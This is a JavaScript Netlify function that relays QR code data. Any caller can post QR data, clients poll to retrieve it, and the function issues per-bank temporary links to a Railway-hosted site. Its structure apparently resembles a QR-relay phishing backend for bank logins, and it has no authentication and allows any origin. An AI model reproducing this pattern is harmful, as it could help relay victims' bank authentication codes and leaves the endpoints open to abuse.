// Netlify Function for QR code API
const crypto = require('crypto');
const path = require('path');

// In-memory storage (will reset on function cold start)
// For production, use a database or external storage
let qrDataStore = {
    currentQR: null,
    lastUpdate: null
};

// Temporary URLs storage
const temporaryUrls = new Map();

function generateSecureToken(length = 32) {
    return crypto.randomBytes(length).toString('hex');
}

function createTemporaryUrl(bankId, expirationMinutes = 720) {
    const token = generateSecureToken();
    const expiration = Date.now() + (expirationMinutes * 60 * 1000);
    
    temporaryUrls.set(token, {
        bankId,
        expiration,
        qrData: null
    });
    
    return token;
}

exports.handler = async (event, context) => {
    // Enable CORS
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS'
    };

    // Handle OPTIONS request
    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 200,
            headers,
            body: ''
        };
    }

    const requestPath = event.path.replace('/.netlify/functions/qr', '') || event.path;

    // POST /api/qr - Submit QR code
    if (event.httpMethod === 'POST' && (requestPath === '/api/qr' || requestPath.includes('/api/qr'))) {
        try {
            const body = JSON.parse(event.body);
            const qrData = body.qrData;

            if (!qrData) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({ error: 'No QR code data provided' })
                };
            }

            // Store QR data
            qrDataStore.currentQR = qrData;
            qrDataStore.lastUpdate = Date.now();

            // If session token provided, store QR for that session
            if (body.sessionToken && temporaryUrls.has(body.sessionToken)) {
                temporaryUrls.get(body.sessionToken).qrData = qrData;
            }

            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({ 
                    message: 'QR code stored successfully',
                    timestamp: qrDataStore.lastUpdate
                })
            };
        } catch (error) {
            return {
                statusCode: 400,
                headers,
                body: JSON.stringify({ error: 'Invalid request' })
            };
        }
    }

    // GET /api/qr - Get current QR code (for polling)
    if (event.httpMethod === 'GET' && (requestPath === '/api/qr' || requestPath.includes('/api/qr'))) {
        const since = event.queryStringParameters?.since;
        
        // If client provides timestamp, only return if updated
        if (since && qrDataStore.lastUpdate && parseInt(since) >= qrDataStore.lastUpdate) {
            return {
                statusCode: 304, // Not Modified
                headers,
                body: JSON.stringify({ updated: false })
            };
        }

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({
                qrData: qrDataStore.currentQR,
                timestamp: qrDataStore.lastUpdate,
                updated: true
            })
        };
    }

    // POST /api/generate-temp-url
    if (event.httpMethod === 'POST' && (requestPath === '/api/generate-temp-url' || requestPath.includes('/api/generate-temp-url'))) {
        try {
            const body = JSON.parse(event.body);
            const { bankId, expirationMinutes } = body;

            if (!bankId) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({ error: 'Invalid bank ID' })
                };
            }

            const token = createTemporaryUrl(bankId.toLowerCase(), expirationMinutes || 720);
            const bankName = bankId.replace(/\s+/g, '');
            const tempUrl = `https://web-production-72c0d.up.railway.app/${bankName}/${token}`;

            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({
                    url: tempUrl,
                    expiresIn: expirationMinutes || 720,
                    token
                })
            };
        } catch (error) {
            return {
                statusCode: 400,
                headers,
                body: JSON.stringify({ error: 'Invalid request' })
            };
        }
    }

    // POST /api/expire-url
    if (event.httpMethod === 'POST' && (requestPath === '/api/expire-url' || requestPath.includes('/api/expire-url'))) {
        try {
            const body = JSON.parse(event.body);
            const { token } = body;

            if (!token || !temporaryUrls.has(token)) {
                return {
                    statusCode: 404,
                    headers,
                    body: JSON.stringify({ error: 'URL not found' })
                };
            }

            temporaryUrls.delete(token);
            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({ message: 'URL expired successfully' })
            };
        } catch (error) {
            return {
                statusCode: 400,
                headers,
                body: JSON.stringify({ error: 'Invalid request' })
            };
        }
    }

    return {
        statusCode: 404,
        headers,
        body: JSON.stringify({ error: 'Not found' })
    };
};

